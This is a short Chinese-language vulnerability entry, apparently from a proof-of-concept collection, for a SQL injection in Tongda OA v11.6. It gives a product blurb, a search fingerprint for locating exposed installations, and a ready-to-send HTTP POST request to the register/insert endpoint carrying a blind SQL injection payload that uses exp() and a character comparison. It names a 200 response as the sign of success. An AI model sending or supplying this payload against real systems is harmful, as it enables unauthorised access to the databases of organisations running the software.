﻿# 通达OA-v116-insert-sql注入

> 更新时间：2024-02-20

> 漏洞编号：

> 漏洞说明：通达OA（Office Automation）是一款企业级协同办公软件，旨在为企业提供高效、便捷、安全、可控的办公环境。它涵盖了企业日常办公所需的各项功能，包括人事管理、财务管理、采购管理、销售管理、库存管理、生产管理、办公自动化等。通达OA支持PC端和移动端使用，可以实现随时随地办公，提高工作效率和协作能力。同时，它还具备高度可定制性和扩展性，可以根据企业的实际需求进行定制开发，满足企业的个性化需求。通达OA广泛应用于各类企业，帮助企业实现数字化转型，提高管理效率和竞争力。

> 漏洞特征：app="TDXK-通达OA"

> 验证脚本：HTTP

```

POST /general/document/index.php/recv/register/insert HTTP/1.1
Content-Type:application/x-www-form-urlencoded
Accept-Encoding: gzip

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：通达OA-v116-insert-sql注入.poc
